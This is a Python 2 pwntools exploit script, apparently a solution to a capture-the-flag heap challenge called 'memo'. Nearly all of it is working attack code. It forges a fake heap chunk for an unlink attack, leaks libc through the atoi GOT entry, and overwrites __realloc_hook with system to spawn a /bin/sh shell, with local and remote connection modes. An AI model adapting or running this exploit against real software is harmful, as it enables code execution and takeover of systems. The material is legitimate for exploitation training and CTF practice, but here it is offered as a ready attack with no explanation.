#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './memo'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla("exit\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def show():
    pass

@choice(idx=2)
def edit(content):
    sla("page:", content)

@choice(idx=3)
def tear(size, content):
    sla("(bytes):\n", size)
    sla("page:\n", content)

@choice(idx=4)
def change_name(name):
    sla("name:\n", name)

@choice(idx=5)
def change_title(data):
    sla("title:\n", data)

def get_libc():
    show()
    rl()
    return uu64(rl())

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    ptr = 0x602040
    page_content = 0x602038
    payload = flat([
        p64(0),
        p64(8),
        p64(ptr-0x18),
        p64(ptr-0x10),
        p64(0x20),
        p64(0x40),
    ])
    change_name(payload)
    payload = flat([
        p64(0)*6,
        p64(0),
        p64(0x21),
        p64(0)*2,
        p64(0x0),
        p64(0x21),
    ])
    edit(payload)
    tear(0x400, "1")
    tear(0x100, "2")
    # 0
    # -- ptr--edit function
    # -- array_602040--change_name
    # -- count-- edit_length
    payload = flat([
        p64(0)*2,
        p64(elf.got['atoi']),
        p64(page_content),
    ])
    change_name(payload)
    libc.address = get_libc() -  libc.sym['atoi']
    lg("libc", libc.address)
    #change page count
    change_name(p64(0x602050) + p64(page_content))
    edit(p64(0))
    #change_ptr
    change_name(p64(libc.sym['__realloc_hook']) + p64(page_content))
    edit(p64(libc.sym['system']))
    change_name(p64(libc.search("/bin/sh").next()))
    sl("3")
    sl(0x100)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

